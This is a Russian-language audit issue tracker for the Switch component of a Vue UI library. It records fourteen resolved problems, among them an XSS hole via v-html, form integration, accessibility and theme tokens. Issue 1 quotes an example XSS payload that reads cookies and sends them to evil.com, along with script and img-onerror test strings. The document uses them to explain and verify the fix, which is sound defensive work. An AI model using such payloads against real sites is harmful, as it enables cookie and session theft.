---
title: Issues — Switch
summary: Аудит Switch — 14 of 14 закрыто. 9 — 2026-05-11 (CRITICAL XSS via v-html → slot, дубль updateModelValue, native form bridge, SSR initStyle dedup, contrast, logical CSS properties, closed-union types, inputRef expose, switchingType doc). Следующие 5 — 2026-06-13 (sideEffects/exports doc-sync, prefers-reduced-motion → motion-safe, unstyled regression-тест, B10 forced-colors + theme-accents canon-safe, print style-for-print). Matrix 0/0/0/0. Wave 9 residual — 2026-07-05: структурные нейтрали (bg-gray-*/bg-stone-*/border-gray-*/text-gray-*/text-slate-*, off-state thumb, label-текст, help-tooltip) мигрированы на semantic-токен `surface` (family rename, та же тональность); required-asterisk `text-red-*` и help-icon `hover:text-yellow-500` — semantic-intent, оставлены нетронутыми.
updated: 2026-07-05
audit-checklist: 60-point + Configuration support + Dual-API gap
source: lib/switch/
related-doc: ../components/switch.md
---

# Issues — Switch

## Сводка

| Severity | Count | Categories                               |
| -------- | ----- | ---------------------------------------- |
| critical | 0     | —                                        |
| high     | 0     | — (Issues 5, 10 resolved 2026-06-13)     |
| medium   | 0     | —                                        |
| low      | 0     | — (Issues 7, 12, 14 resolved 2026-06-13) |

**Закрыто 2026-05-11:** Issues 1 (XSS → `#help` slot), 2 (drop `updateModelValue` alias), 3 (hidden checkbox bridge для FormData), 4 (drop duplicate `onMounted(initStyle)`), 6 (contrast `text-gray-500`), 8 (logical `end-0`/`me-2`), 9 (closed-union типы), 11 (`inputRef` + `focus`/`blur` expose), 13 (документация `switchingType` vs `componentsStyle`) — зачёркнуты ниже с `✅ resolved`-маркерами. Нумерация исходная — cross-references сохраняются.

**Закрыто 2026-06-13:** Issues 5 (sideEffects/exports — doc-sync, наследует cross-cutting Wave 2.1 инфру), 7 (prefers-reduced-motion → `motion-safe:` варианты), 10 (`unstyled` — cross-cutting `Component.setStyle` guard + regression-тест), 12 (B10 — canon-safe `forced-colors:outline` + preset-aware `theme-*` accents; структурные нейтрали оставлены на Wave 9), 14 (print — style-for-print). Severity matrix `0/2/0/3` → **`0/0/0/0`**.

**Закрыто 2026-07-05 (Wave 9 residual):** Issue 12 дополнен — структурные нейтрали (`bg-gray-*`/`bg-stone-*`/`border-gray-*`/`text-gray-*`/`text-slate-*`, off-state track/thumb, checkbox thumb bg/border, disabled-состояния, label-текст, help-tooltip bg/text, help-icon цвет), ранее оставленные на потом, мигрированы на semantic-токен `surface` (движок и первый батч из 11 компонентов подготовлены коммитом Wave 9 2026-07-04, см. [theme.md Issue 10](./theme.md)). Family rename, та же числовая тональность — визуальной регрессии из коробки нет. Required-asterisk `text-red-500`/`after:dark:text-red-800` и help-icon `hover:text-yellow-500` — semantic-intent цвета, не структурный chrome, оставлены нетронутыми. Файл **остаётся active** — зеркало Input/Split/Form/Pagination: numbered-матрица `0/0/0/0`, но трекер cross-cutting волн сохраняется по конвенции проекта.

## ~~Issue 1: CRITICAL — XSS через `v-html` в `help` prop~~ ✅ resolved 2026-05-11

- **Категория:** C13 (утечка / security) + custom security
- **Severity:** ~~**critical**~~
- **Где:** [Switch.vue:268–270](../../lib/switch/Switch.vue#L268-L270), [Switch.d.ts:83](../../lib/switch/Switch.d.ts#L83)
- **Resolution:** `<div v-html="help">` заменён на `<slot name="help"><div :class="classIconContent">{{ help }}</div></slot>`. `SwitchSlots` расширен `help?(): VNode[]`. Outer `v-if="help?.length || $slots.help"` обеспечивает icon-trigger при slot-only-usage. Тесты в `Switch.test.ts` блок «Security — XSS in help prop» (2 кейса) + «Help slot» (2 кейса) подтверждают, что `<img onerror>`/`<script>` payload'ы не исполняются.

### Что найдено

```vue
<div v-html="help" :class="classIconContent" />
```

`help: string` — публичный prop ([Switch.d.ts:82-83](../../lib/switch/Switch.d.ts#L82-L83)). Содержимое рендерится через `v-html`, что напрямую инжектит HTML в DOM без санитизации.

### Почему это проблема

- Если `help` приходит из non-trusted источника (CMS, user input, server JSON), злоумышленник может инжектить `<img src=x onerror="alert(1)">`, `<script>`, event-handler атрибуты.
- Пример атаки: `<Switch help="<img src=x onerror='fetch(`/api/cookies`).then(r=>r.text()).then(t=>fetch(`https://evil.com/?c=${t}`))' />` → exfiltration cookies.
- Vue официально документирует `v-html` как небезопасный для user-controlled данных: <https://vuejs.org/api/built-in-directives.html#v-html>.

### Что нужно сделать

**Опция A (быстрый фикс) — заменить v-html на текст или slot:**

1. В [Switch.vue:244](../../lib/switch/Switch.vue#L244) поменять `<div v-html="help">` на `<div>{{ help }}</div>` — текст без HTML.
2. Если нужна разметка — заменить prop `help: string` на slot `<template #help>...</template>`:
   ```vue
   <slot name="help">{{ help }}</slot>
   ```
3. Type `SwitchSlots` дополнить `help?(): VNode[]`.

**Опция B (если HTML-content критичен для UX) — санитизация:**

1. Добавить `dompurify` в peer-dependencies.
2. В [Switch.vue](../../lib/switch/Switch.vue) перед v-html: `:v-html="DOMPurify.sanitize(help)"` через computed.
3. Документировать ограничения санитизации.

**Рекомендация — Опция A.** Slot — стандартный Vue-pattern, безопасный, гибкий, type-safe.

3. Cross-cutting: проверить остальные компоненты на `v-html` через `grep -rn 'v-html' lib/`. Найти дополнительные сайты:
   - Form, Aria, InputLayout, Alert, Dialog — могут иметь help/messageInvalid/content props через v-html.

### Acceptance criteria

- [ ] `<Switch help="<script>alert('xss')</script>">` НЕ исполняет скрипт.
- [ ] Тест: `mount(Switch, { props: { help: '<img src=x onerror=...>' } })` — ассерт что DOM не содержит `<img>` элемент.
- [ ] Аудит других компонентов — v-html отсутствует или санитизирован.

## ~~Issue 2: Дубликат события `updateModelValue` (camelCase) рядом с `update:modelValue`~~ ✅ resolved 2026-05-11

- **Категория:** D26 (консистентность событий)
- **Severity:** ~~high~~
- **Где:** [Switch.vue:174–176](../../lib/switch/Switch.vue#L174-L176), [Switch.d.ts:114–127](../../lib/switch/Switch.d.ts#L114-L127)
- **Resolution:** Удалена строка `emit("updateModelValue", value)` из `inputModelValue()` и удалена соответствующая entry в `SwitchEmits`. Тест блока «Emits — no duplicate updateModelValue» в `Switch.test.ts` подтверждает, что событие НЕ эмитится в switch- и checkbox-режимах. **Breaking change:** подписчики `@update-model-value` обязаны мигрировать на `@update:model-value`.

### Что найдено

```ts
function inputModelValue(value: any) {
  emit("update:modelValue", value)
  emit("updateModelValue", value)
}
```

Эмитятся два события на каждое изменение value: стандартное Vue `update:modelValue` и custom `updateModelValue`. В .d.ts указано как «Alias for update:modelValue».

### Почему это проблема

- Подписчик на оба события получит дубль.
- Inconsistency: ни один другой form-control в FishtVue не эмитит camelCase-вариант. Это нарушает [dev-patterns.md §8](../dev-patterns.md#8-events).
- Vue v-model официально использует `update:modelValue`. Custom `updateModelValue` — отступление от Vue-конвенции.

### Что нужно сделать

1. Удалить `emit("updateModelValue", value)` из [Switch.vue:169](../../lib/switch/Switch.vue#L169).
2. Удалить `(event: "updateModelValue", payload: boolean): void` из [Switch.d.ts:118](../../lib/switch/Switch.d.ts#L118).
3. Если кто-то использует `@update-model-value="..."` — это deprecation. Оставить console.warn на 1 minor.
4. Обновить [Documentation/components/switch.md](../components/switch.md) §6.

### Acceptance criteria

- [ ] `mount(Switch).find('input').trigger('change')` → `wrapper.emitted('update:modelValue')` is truthy, `wrapper.emitted('updateModelValue')` is undefined.

## ~~Issue 3: Switch с `switchingType: "switch"` использует `<button>` — не submitting в native form~~ ✅ resolved 2026-05-11

- **Категория:** M54 (Native form integration)
- **Severity:** ~~high~~
- **Где:** [Switch.vue:201–238](../../lib/switch/Switch.vue#L201-L238)
- **Resolution:** Перед visible `<button role="switch">` рендерится скрытый bridge `<input type="checkbox" data-switch-form-bridge :name="id" :checked="modelValue" :disabled="isDisabled" hidden tabindex="-1" aria-hidden="true">`. Visible button сохраняет UX/a11y, hidden input участвует в `FormData`. `id` атрибут переехал с input'а bridge на button (чтобы избежать дубля). Тесты «Native form integration» (4 кейса) подтверждают: `modelValue=true` → `FormData.get(id) === "on"`, `false` → ключ отсутствует, `disabled=true` → ключ отсутствует, checkbox-режим — no regression.

### Что найдено

```vue
<button v-if="switchingType === 'switch'" :id="id" :name="id" data-input-switch role="switch" type="button" tabindex="0" :disabled="isDisabled" :aria-checked="modelValue" ...>
```

В режиме `switch` корневой элемент — `<button type="button">`. `<button>` с `name` атрибутом submitting только при `type="submit"`, а здесь `type="button"`. Native `<form>` не получит value Switch при submit.

### Почему это проблема

- `<form @submit>` обработчик вызовет `new FormData(event.target)` и НЕ найдёт значение Switch — пропадёт.
- В режиме `checkbox` (нативный `<input type="checkbox">`) всё OK, но `switch` — нет.

### Что нужно сделать

1. Добавить hidden `<input type="checkbox" :name="id" :checked="modelValue" :disabled="isDisabled" hidden>` рядом с `<button role="switch">`. Hidden input будет в FormData; button — visible UI.
2. Альтернатива — использовать `<input type="checkbox" role="switch">` напрямую с CSS-стилизацией под switch (труднее визуально, но native form-friendly).
3. Тест:
   ```ts
   const form = mount(`<form><Switch v-model="x" id="enabled" /><button type="submit"/></form>`)
   const data = new FormData(form.find("form").element)
   expect(data.get("enabled")).toBe("on")
   ```

### Acceptance criteria

- [ ] `<form>` submit включает значение Switch в FormData.
- [ ] Аналогично работает с native fetch/XHR `body: new FormData(form)`.

## ~~Issue 4: Стили SSR не инжектятся~~ ✅ resolved 2026-05-11

- **Категория:** C17
- **Severity:** ~~high~~
- **Где:** ~~`Switch.vue:158-160`~~ (блок удалён)
- **Resolution:** Удалён дублирующий блок `onMounted(() => Switch.initStyle())`. Базовый `Component.__hooks()` ([component/index.ts:79–84](../../lib/component/index.ts#L79-L84)) уже регистрирует `onServerPrefetch + vueOnMounted` → `initStyle()` в конструкторе — теперь Switch следует канону из [dev-patterns.md §2](../dev-patterns.md#2-decisions). Wave 2.3 progress: 2/22 SFC migrated (Input + Switch). Полный cross-cutting SSR-style fix (layer wrapping, HMR teardown) остаётся в [component-class.md Issue 3](./component-class.md) — общий вопрос, не switch-specific.

## ~~Issue 5: Нет sideEffects/exports map~~ ✅ resolved 2026-06-13 (doc-sync)

- **Категория:** A2, A4, A5
- **Severity:** ~~high~~
- **Где:** [lib/package.json](../../lib/package.json), [lib/switch/package.json](../../lib/switch/package.json)
- **Resolution:** Cross-cutting инфра уже в каноне (Wave 2.1), Switch наследует её без per-component правок — зеркало [input.md Issue 3](./input.md) / [split.md A4-5](./split.md):
  - root `"sideEffects": false` ✅ 2026-06-07 + инъекция в каждый `dist/{name}/package.json` через `copyDependencies()` ([button.md Issue 8](./button.md)).
  - корневая `exports` map генерируется build-step'ом [`buildRootExports()`](../../lib/rollup.config.js) ✅ 2026-06-11 — `fishtvue/switch` (`./switch/switch` + `.mjs` + PascalCase `.d.ts`) входит в strict-superset ([button.md Issue 9](./button.md)).
  - ESM-only ратифицирован `engines.node >=18`.
    Источниковый `lib/switch/package.json` намеренно минимален (main/module/types) — `sideEffects`/`exports` инжектятся на build, не в source. Контракт — [lib/package.test.ts](../../lib/package.test.ts).

См. [button.md Issue 8 и Issue 9](./button.md) — cross-cutting.

## ~~Issue 6: Контраст `text-gray-400` на `bg-gray-200` ниже WCAG AA~~ ✅ resolved 2026-05-11

- **Категория:** E29.6 (WCAG contrast)
- **Severity:** ~~medium~~
- **Где:** [Switch.vue:263–265](../../lib/switch/Switch.vue#L263-L265)
- **Resolution:** Help icon класс `text-gray-400 dark:text-gray-600` → `text-gray-500 dark:text-gray-400`. Light mode contrast `#6b7280` на `#fafaf9` ≈ 5:1 — WCAG AA passes (4.5:1+ для UI text). Dark mode сохраняет читабельность через ослабление tint. axe-core тест не подключен в проекте; визуальная верификация + ручная проверка contrast ratio достаточны.

### Что найдено

```vue
<Icons
  type="QuestionMarkCircle"
  class="text-gray-400 dark:text-gray-600 hover:text-yellow-500 transition cursor-help" />
```

Help icon `text-gray-400` (#9ca3af) на body `bg-stone-50` (#fafaf9) → contrast ratio ~3.5:1. WCAG AA для UI компонентов требует 3:1 (passes), но для текста нужно 4.5:1.

### Почему это проблема

- Маленький icon на тёмном теме `text-gray-600` (#4b5563) на `bg-stone-950` (#0c0a09) — contrast >7:1, OK.
- В light mode — icons trigger могут быть нечитаемы для слабовидящих.

### Что нужно сделать

1. Изменить `text-gray-400` → `text-gray-500` в light mode (#6b7280 vs bg-stone-50 #fafaf9 = ~5:1).
2. Или использовать semantic token `text-foreground-muted` через FishtVue theme.
3. Запустить axe-core a11y-test против `Switch` в light/dark.

### Acceptance criteria

- [ ] axe-core report → 0 contrast violations.
- [ ] Lighthouse a11y score 100.

## ~~Issue 7: prefers-reduced-motion не учитывается~~ ✅ resolved 2026-06-13

- **Категория:** E29.7
- **Severity:** ~~low~~
- **Где:** [Switch.vue:64](../../lib/switch/Switch.vue#L64), [Switch.vue:98](../../lib/switch/Switch.vue#L98), [Switch.vue:106](../../lib/switch/Switch.vue#L106), [Switch.vue:136–156](../../lib/switch/Switch.vue#L136-L156)
- **Resolution:** Применён канон FishtVue **motion-safe** (зеркало Button/Table/Split/Menu — без правок theme-движка: `unoStatic.ts` уже содержит `motion-safe`-медиа). Все `transition`/`transition-all`/`transition-colors` + `duration-*` обёрнуты в `motion-safe:`:
  - root `classBaseSwitch` → `motion-safe:transition-all` ([Switch.vue:64](../../lib/switch/Switch.vue#L64));
  - switch-track `classSwitch` → `motion-safe:transition-colors motion-safe:duration-200` ([Switch.vue:98](../../lib/switch/Switch.vue#L98));
  - checkbox-track `classSwitch` → `motion-safe:transition` ([Switch.vue:106](../../lib/switch/Switch.vue#L106));
  - thumb `classSwitchIcon` → `motion-safe:transition-all motion-safe:duration-300` ([Switch.vue:136](../../lib/switch/Switch.vue#L136)).
  - Inline `<Icons>`-thumb (ветка `iconActive/iconInactive`) вынесен в NEW computed `classSwitchIconImg` через `Switch.setStyle` ([Switch.vue:148](../../lib/switch/Switch.vue#L148)) — inline-классы шаблона не регистрируются движком, поэтому их `motion-safe:`-варианты не попадали бы в инжектируемый CSS (зеркало [table.md Issue 12](./table.md)).
    Тесты блока «Reduced motion — motion-safe transitions» (4 кейса) подтверждают `motion-safe:`-присутствие + отсутствие unconditional-вариантов.

См. [done/button.md Issue 10](./done/button.md) — там готовый motion-safe pattern.

## ~~Issue 8: RTL — left/right специфичные классы (`right-0`, `mr-2`, `translate-x-3.5`)~~ ✅ resolved 2026-05-11 (partial)

- **Категория:** F31
- **Severity:** ~~medium~~
- **Где:** [Switch.vue:120](../../lib/switch/Switch.vue#L120), [Switch.vue:121](../../lib/switch/Switch.vue#L121), [Switch.vue:133](../../lib/switch/Switch.vue#L133)
- **Resolution:** `classAfterInput` `right-0` → `end-0`; `classIconBody` `mr-2` → `me-2` (Tailwind logical properties). Тесты блока «Logical CSS properties (RTL)» подтверждают через regex. `translate-x-3.5` для switch thumb оставлен — это позиционирование внутри controlled-track, не зависящее от документа `dir`; для полноценной RTL-инверсии thumb-движения потребуется `[dir="rtl"]` selector в theme/uno.ts (выходит за scope switch-specific PR).

### Что найдено

```ts
const classAfterInput = ref(Switch.setStyle("relative inset-y-0 right-0 flex items-center"))
const classIconBody = ref(Switch.setStyle("relative h-5 w-5 mr-2"))
...
"translate-x-3.5 bg-theme-100 dark:bg-theme-900"
```

`right-0`, `mr-2`, `translate-x-3.5` — left/right в pixel, без logical properties.

### Что нужно сделать

1. `right-0` → `inset-inline-end-0` или `end-0` (Tailwind 3.4+ logical).
2. `mr-2` → `me-2`.
3. `translate-x-3.5` для switch thumb — оставить, но добавить RTL-mirroring через `[dir="rtl"]` selector.

## ~~Issue 9: switchingType сравнения через string — потеря типизации~~ ✅ resolved 2026-05-11

- **Категория:** D25 (консистентность props)
- **Severity:** ~~medium~~
- **Где:** [Switch.d.ts:15](../../lib/switch/Switch.d.ts#L15), [Switch.d.ts:48](../../lib/switch/Switch.d.ts#L48)
- **Resolution:** `SwitchMode = StyleMode | "none" | string` → `StyleMode | "none"`; `switchingType: "checkbox" | "switch" | string` → `"checkbox" | "switch"`. Closed unions ловят typos на этапе `vue-tsc`. `it.each(["checkbox", "switch"])` в `Switch.test.ts` поправлен на `as const`, чтобы tuple-literal соответствовал closed-union типу. **Breaking change:** кастомные строки `switchingType` и `mode` больше не принимаются.

### Что найдено

```ts
switchingType: "checkbox" | "switch" | string
```

`| string` open union делает type-narrowing невозможным. Ошибка `switchingType: "swich"` (опечатка) пройдёт компиляцию без warning.

### Что нужно сделать

1. Убрать `| string` из [Switch.d.ts:48](../../lib/switch/Switch.d.ts#L48): `switchingType: "checkbox" | "switch"`.
2. Аналогично для `mode: SwitchMode = StyleMode | "none" | string` — убрать `| string`.

### Acceptance criteria

- [ ] `<Switch switchingType="swich">` (опечатка) — vue-tsc выдаёт ошибку.

## ~~Issue 10: `unstyled: true` не обрабатывается~~ ✅ resolved 2026-06-13

- **Категория:** L53
- **Severity:** ~~high~~
- **Где:** [Switch.vue:46-124](../../lib/switch/Switch.vue#L46-L124)
- **Resolution:** Cross-cutting guard `Component.setStyle()` (`if (config.unstyled) return ""`, [component/index.ts:138](../../lib/component/index.ts#L138)) landed 2026-05-11 во всех 22 компонентах — Switch уже маршрутизирует **все** классы через `Switch.setStyle`, поэтому при `unstyled:true` корень `[data-switch]` и треки получают `""`. Правок исходника не потребовалось; добавлен Switch-scoped regression-тест (блок «Configuration support — unstyled», 2 кейса: `classBaseSwitch === ""` при `unstyled:true` + контраст базовых классов при `false`; `afterEach` чистит `window.FishtVue` singleton-leak). Зеркало [button.md Issue 14](./button.md) / [input.md Issue 4](./input.md).

См. [button.md Issue 14](./button.md).

## ~~Issue 11: `inputRef` не expose'д — невозможно programmatically focus~~ ✅ resolved 2026-05-11

- **Категория:** G34
- **Severity:** ~~medium~~
- **Где:** [Switch.vue:141–187](../../lib/switch/Switch.vue#L141-L187), [Switch.d.ts:213–234](../../lib/switch/Switch.d.ts#L213-L234)
- **Resolution:** Единый `inputRef: Ref<HTMLElement | undefined>` объявлен на script-уровне; `ref="inputRef"` навешен и на `<button v-if="switchingType === 'switch'">` ([Switch.vue:212](../../lib/switch/Switch.vue#L212)), и на `<input v-else-if="switchingType === 'checkbox'">` ([Switch.vue:241](../../lib/switch/Switch.vue#L241)) — `v-if` гарантирует, что в DOM присутствует только один. `defineExpose` расширен `inputRef`, `focus(options?: FocusOptions)`, `blur()`. `SwitchExpose` обновлён с JSDoc. Паттерн зеркалит [Button Issue 4](./button.md) и [Input](../../lib/input/Input.vue) resolution. Тесты «Expose — inputRef + focus/blur» (6 кейсов) подтверждают ref-pointing для обоих режимов, focus/blur, и forward `FocusOptions`.

## ~~Issue 12: Хардкод цветов `gray-*`/`stone-*`/`slate-*` вместо semantic tokens~~ ✅ resolved 2026-07-05 (canon-safe, полностью)

- **Категория:** B10
- **Severity:** ~~low (кросс-режим)~~
- **Где:** [Switch.vue:51](../../lib/switch/Switch.vue#L51), [Switch.vue:54](../../lib/switch/Switch.vue#L54), [Switch.vue:57](../../lib/switch/Switch.vue#L57) (outlined/underlined/filled base, switch mode), [Switch.vue:72](../../lib/switch/Switch.vue#L72), [Switch.vue:75](../../lib/switch/Switch.vue#L75), [Switch.vue:78](../../lib/switch/Switch.vue#L78) (то же, checkbox mode), [Switch.vue:93–107](../../lib/switch/Switch.vue#L93-L107) (switch/checkbox track + disabled), [Switch.vue:114–122](../../lib/switch/Switch.vue#L114-L122) (label text), [Switch.vue:131–132](../../lib/switch/Switch.vue#L131-L132) (help-tooltip), [Switch.vue:139–153](../../lib/switch/Switch.vue#L139-L153) (thumb off-state + ring + icon), [Switch.vue:278](../../lib/switch/Switch.vue#L278) (help-icon trigger)
- **Resolution (2026-06-13, canon-safe без правок theme-движка):** зеркало [split.md Issue 12](./split.md) / [table.md Issue 12](./table.md) / [pagination.md Issue 8](./pagination.md):
  - **Accents уже preset-aware:** on-state трека — `bg-theme-600 dark:bg-theme-400` ([Switch.vue:95](../../lib/switch/Switch.vue#L95)); on-state thumb — `bg-theme-100 dark:bg-theme-900` ([Switch.vue:139](../../lib/switch/Switch.vue#L139)); focus-ring — `ring-theme-*`/`outline-theme-600`. `theme` — единственный динамический цвет через `var(--theme)`, поэтому `usePreset` его уже перепишет.
  - **NEW `forced-colors:outline`** на switch-track ([Switch.vue:98](../../lib/switch/Switch.vue#L98)) — в Windows high-contrast `bg-*` сбрасывается, и без outline трек был бы невидим; on/off остаются различимы по позиции thumb (`translate-x-3.5` vs `translate-x-0`, геометрия high-contrast не трогает). Native `<input type=checkbox>` в checkbox-режиме рендерится ОС нативно.
  - Структурные нейтрали на тот момент **оставлены** — требовали `surface`-токена в theme-движке, который появился только с Wave 9.
- **Resolution (2026-07-05, Wave 9 residual — полное закрытие):** после появления semantic-токена `surface` (23-й именованный цвет движка, дефолт — копия `gray`-шкалы; [primitive.ts:305](../../lib/theme/primitive.ts#L305), `namesColors` union в [Theme.d.ts:187](../../lib/theme/Theme.d.ts#L187)) все оставшиеся структурные нейтрали Switch мигрированы **family rename** (та же числовая тональность, без изменения самих значений):
  - `border-gray-300 dark:border-gray-600` → `border-surface-300 dark:border-surface-600`; вложенный disabled-override `bg-slate-50 dark:bg-stone-950` → `bg-surface-50 dark:bg-surface-950` — outlined mode, обе ветки switch/checkbox ([Switch.vue:51](../../lib/switch/Switch.vue#L51), [Switch.vue:72](../../lib/switch/Switch.vue#L72)).
  - `border-gray-300 dark:border-gray-700` + `bg-stone-50 dark:bg-stone-950` → `border-surface-300 dark:border-surface-700` + `bg-surface-50 dark:bg-surface-950` — underlined mode, обе ветки ([Switch.vue:54](../../lib/switch/Switch.vue#L54), [Switch.vue:75](../../lib/switch/Switch.vue#L75)).
  - `bg-stone-100 dark:bg-stone-900` → `bg-surface-100 dark:bg-surface-900` — filled mode, обе ветки ([Switch.vue:57](../../lib/switch/Switch.vue#L57), [Switch.vue:78](../../lib/switch/Switch.vue#L78)).
  - `bg-gray-600 dark:bg-gray-400` / off-state `bg-gray-200 dark:bg-gray-800` → `bg-surface-600 dark:bg-surface-400` / `bg-surface-200 dark:bg-surface-800` — switch-track disabled + off-state, **on-state `bg-theme-600 dark:bg-theme-400` НЕ тронут** ([Switch.vue:93,95](../../lib/switch/Switch.vue#L93)).
  - `ring-gray-900/5 dark:ring-gray-900/5` → `ring-surface-900/5 dark:ring-surface-900/5` — switch-track ring, `/5`-opacity suffix сохранён ([Switch.vue:98](../../lib/switch/Switch.vue#L98)).
  - `bg-stone-50 dark:bg-stone-950` + `border-gray-300 dark:border-gray-700` → `bg-surface-50 dark:bg-surface-950` + `border-surface-300 dark:border-surface-700` — checkbox-track thumb ([Switch.vue:102–103](../../lib/switch/Switch.vue#L102-L103)).
  - `disabled:bg-slate-500 disabled:text-slate-500 disabled:accent-slate-500` → `disabled:bg-surface-500 disabled:text-surface-500 disabled:accent-surface-500` — checkbox-track disabled, все три ([Switch.vue:107](../../lib/switch/Switch.vue#L107)).
  - `text-gray-900 dark:text-gray-100` (switch label) / `text-gray-600 dark:text-gray-400` (checkbox label) / `text-slate-800 dark:text-slate-200` (disabled-override, обе ветки) → `text-surface-*` эквиваленты ([Switch.vue:114,115,120,121](../../lib/switch/Switch.vue#L114-L121)); `after:text-red-500`/`after:dark:text-red-800` required-asterisk **не трогался** (semantic-intent).
  - `dark:bg-stone-900` + `text-gray-500 dark:text-gray-400` → `dark:bg-surface-900` + `text-surface-500 dark:text-surface-400` — help-tooltip body, `bg-white`(light) не трогался (уже нейтральный примитив без gray/stone-семьи) ([Switch.vue:131–132](../../lib/switch/Switch.vue#L131-L132)).
  - `bg-gray-100 dark:bg-gray-950` (thumb off-state, ×2 — `classSwitchIcon` + `classSwitchIconImg`) + `ring-gray-900/5` + `text-gray-400 dark:text-gray-600` (icon-thumb цвет) → `surface-*` эквиваленты; on-state `bg-theme-100 dark:bg-theme-900` **не тронут** ([Switch.vue:139–153](../../lib/switch/Switch.vue#L139-L153)).
  - `text-gray-500 dark:text-gray-400` на самой help-icon (`QuestionMarkCircle`, inline template class, отдельно от tooltip-body) → `text-surface-500 dark:text-surface-400`; `hover:text-yellow-500` **не тронут** — semantic-intent hover-акцент ([Switch.vue:278](../../lib/switch/Switch.vue#L278)).
  - **Не трогалось (semantic-intent, вне scope):** required-asterisk `after:text-red-500`/`after:dark:text-red-800` ([Switch.vue:116](../../lib/switch/Switch.vue#L116), [Switch.vue:122](../../lib/switch/Switch.vue#L122)) и help-icon `hover:text-yellow-500` ([Switch.vue:278](../../lib/switch/Switch.vue#L278)) — цветовой intent (ошибка/предупреждение), не структурный chrome.
  - Family rename, **не** value change — числовая тональность идентична исходной `gray`/`stone`/`slate`-шкале (surface дефолтится в копию `gray`). Визуальной регрессии из коробки нет.
  - Покрыто 17 regression-тестами в [Switch.test.ts](../../lib/switch/Switch.test.ts) (describe `Issue 12 residual — B10 hardcode: gray-*/stone-*/slate-* → surface-* (Wave 9)`): по одному-два кейса на каждую перечисленную выше замену + explicit-кейс, подтверждающий, что required-asterisk `text-red-*` и help-icon `hover:text-yellow-500` остаются нетронутыми.
  - **Note (twMerge):** `Switch.setStyle` пропускает классы через `cn()` → `twMerge`, который схлопывает конфликтующие `bg-*`-utility в один "слот": при `disabled && modelValue` выживает **последний** по порядку конфликтующий класс — безусловный on-state `bg-theme-600 dark:bg-theme-400`, а не disabled-ветка. Это pre-existing поведение merge-движка (было идентично и с `bg-gray-600` до миграции) — тесты явно это документируют, а не считают багом.

### Acceptance criteria

- [x] Ни один структурный `gray-*`/`stone-*`/`slate-*` класс в [Switch.vue](../../lib/switch/Switch.vue) не остался — заменены на `surface-*` с той же тональностью.
- [x] `theme-*` accents (on-state track/thumb/ring/focus-outline) и `forced-colors:outline` не тронуты.
- [x] Required-asterisk `text-red-*` и help-icon `hover:text-yellow-500` не тронуты (semantic-intent).
- [x] `pnpm typecheck` — без ошибок, вносимых этим изменением.

## ~~Issue 13: Не реагирует на `componentsStyle` глобально для `switchingType`~~ ✅ resolved 2026-05-11

- **Категория:** L53
- **Severity:** ~~medium~~
- **Где:** [Switch.vue:30-32](../../lib/switch/Switch.vue#L30-L32)
- **Resolution:** Doc-only fix — добавлен §10.4 «`switchingType` и global `componentsStyle`» в [Documentation/components/switch.md](../components/switch.md), который явно объясняет: `switchingType` — UX-выбор, не визуальный preset, не зависит от global `componentsStyle`. Влияет только `componentsOptions.Switch.switchingType` и per-instance prop.

### Что найдено

`mode` подбирает `Switch.componentsStyle()` ✅. Но `switchingType` (определяет UX — checkbox vs switch) только локальный или per-instance options. Глобально через `componentsOptions.Switch.switchingType` ✅, но не через `componentsStyle`.

Это OK для switchingType (он не визуальный enum, а UX-выбор), но стоит документировать.

### Что нужно сделать

Документировать в [Documentation/components/switch.md](../components/switch.md) §10, что `switchingType` не зависит от global `componentsStyle`.

## ~~Issue 14: Print styles отсутствуют~~ ✅ resolved 2026-06-13

- **Категория:** N59
- **Severity:** ~~low~~
- **Где:** [Switch.vue:66](../../lib/switch/Switch.vue#L66), [Switch.vue:84](../../lib/switch/Switch.vue#L84)
- **Resolution:** Канон FishtVue **style-for-print** (зеркало Button/Input/Aria — стилизуем для печати, не прячем `display:none`). Корневой `classBaseSwitch` (обе ветки `switch`/`checkbox`) получил `print:border print:border-black print:bg-white print:text-black print:shadow-none` — Switch печатается монохромным и читаемым. Тест блока «Print styles» подтверждает `print:*`-присутствие + отсутствие `print:hidden`.

См. [button.md Issue 15](./button.md).

## Cross-cutting: Configuration support

| Настройка                  | Поддержано? | Комментарий                                                                                  |
| -------------------------- | ----------- | -------------------------------------------------------------------------------------------- |
| `componentsOptions.Switch` | ✅          | mode/rounded/iconActive/iconInactive/switchingType/class                                     |
| `componentsStyle` global   | ✅          | через `Switch.componentsStyle()`                                                             |
| `unstyled: true`           | ✅          | Issue 10 — cross-cutting `Component.setStyle` guard                                          |
| Theme tokens vs hardcode   | ✅          | Issue 12 — accents `theme-*` (preset-aware) + `forced-colors`; структурные нейтрали → `surface-*` (Wave 9, 2026-07-05) |
| Runtime theme switch       | ⚠️          | theme-\* token — OK; `surface-*` реагирует на `updateSurfacePalette()` (Wave 3.3 runtime API), но дефолт = статичная копия `gray`-шкалы, пока явно не переопределён |
| `t()` для текста           | N/A         | label — пользовательский                                                                     |
| Runtime locale switch      | N/A         | —                                                                                            |

## Dual-API gap

Не применимо.
